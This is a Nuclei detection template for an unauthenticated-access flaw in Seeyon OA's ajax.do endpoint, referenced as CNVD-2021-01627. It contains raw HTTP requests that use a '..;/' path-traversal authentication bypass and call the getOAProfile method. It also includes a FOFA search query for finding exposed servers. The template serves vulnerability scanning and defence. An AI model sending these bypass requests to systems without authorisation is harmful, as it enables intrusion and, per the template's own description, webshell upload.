http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1, "java.lang.NullPointerException:null")
    - status_code_2 == 200 && contains(body_2,"companyName")
    type: dsl
  raw:
  - 'POST /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/71.0.3578.98 Safari/537.36

    Accept: */*

    Accept-Encoding: gzip

    '
  - 'GET /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/71.0.3578.98 Safari/537.36

    Accept: */*

    Accept-Encoding: gzip

    '
  req-condition: true
id: seeyon-ajax-unauth
info:
  author: pikpikcu
  description: "\u63A5\u53E3\u672A\u6388\u6743\u8BBF\u95EE\uFF0C\u53EF\u8C03\u7528\
    \u6587\u4EF6\u4E0A\u4F20\u63A5\u53E3\u4E0A\u4F20webshell\u3002"
  metadata:
    fofa-query: "app=\"\u81F4\u8FDC\u4E92\u8054-OA\""
    verified: true
  name: Seeyon AJAX Unauthoried Access
  reference:
  - https://buaq.net/go-53721.html
  - https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA
  - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627.html
  severity: high
  tags: misconfig,seeyon,unauth,ajax
